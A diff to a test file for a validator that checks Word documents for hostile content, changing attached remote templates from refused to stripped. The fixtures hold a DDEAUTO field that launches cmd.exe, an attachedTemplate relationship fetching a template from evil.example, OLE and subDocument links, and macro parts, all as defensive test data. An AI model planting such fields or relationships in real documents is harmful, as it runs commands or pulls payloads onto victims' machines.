@@ -46,8 +46,11 @@ describe('template check (office-template.ts)', () => {
     }
     const header = addPart(base, 'word/header1.xml', `<w:hdr xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:p><w:fldSimple w:instr="DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe &quot;/k calc&quot;"><w:r><w:t>x</w:t></w:r></w:fldSimple></w:p></w:hdr>`)
     expect(() => checkOfficeTemplate('docx', header)).toThrow(/word\/header1\.xml has a DDEAUTO field/)
+    // an attached template is taken OUT, not refused (TC-4949): real Word templates carry one (Normal.dotm)
     const attached = addPart(base, 'word/_rels/settings.xml.rels', `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${R('attachedTemplate', 'http://evil.example/t.dotm')}</Relationships>`)
-    expect(() => checkOfficeTemplate('docx', attached)).toThrow(/attachedTemplate/)
+    const strippedRels = new TextDecoder().decode(readZip(checkOfficeTemplate('docx', attached)).find((e) => e.name === 'word/_rels/settings.xml.rels')!.data)
+    expect(strippedRels).not.toContain('attachedTemplate')
+    expect(strippedRels).not.toContain('evil.example')
     for (const t of ['oleObject', 'frame', 'subDocument']) expect(() => checkOfficeTemplate('docx', edit(base, 'word/_rels/document.xml.rels', (x) => x.replace('</Relationships>', `${R(t, 'file:///c:/a')}</Relationships>`)))).toThrow(new RegExp(t))
     expect(() => checkOfficeTemplate('docx', edit(base, 'word/_rels/document.xml.rels', (x) => x.replace('</Relationships>', `${R('image', 'http://x/track.png')}</Relationships>`)))).toThrow(/outside the file \(image/)
     expect(() => checkOfficeTemplate('docx', addPart(base, 'word/vbaProject.bin', 'x'))).toThrow(/macros/)
@@ -68,7 +71,8 @@ describe('hostile spellings (security review): quoting, spaces, another prefix, 
   withPandoc('relationships with single quotes, spaces around =, odd case: still refused', () => {
     const base = made('# T\n', 'docx')
     const rels = (rel: string) => addPart(base, 'word/_rels/settings.xml.rels', `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${rel}</Relationships>`)
-    expect(() => checkOfficeTemplate('docx', rels(`<Relationship Id='r1' Type='http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate' Target='http://evil.example/t.dotm' TargetMode='External'/>`))).toThrow(/attachedTemplate/)
+    // an attached template written with single quotes is taken out all the same (parsed, not pattern-matched)
+    expect(new TextDecoder().decode(readZip(checkOfficeTemplate('docx', rels(`<Relationship Id='r1' Type='http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate' Target='http://evil.example/t.dotm' TargetMode='External'/>`))).find((e) => e.name === 'word/_rels/settings.xml.rels')!.data)).not.toContain('attachedTemplate')
     expect(() => checkOfficeTemplate('docx', rels(`<Relationship Id = "r1" Type = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target = "http://x/y.png" TargetMode = "External" />`))).toThrow(/outside the file/)
     expect(() => checkOfficeTemplate('docx', rels(`<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="http://x/y.png" TargetMode=" external "/>`))).toThrow(/outside the file/)
     // a prefixed relationships element is the same element
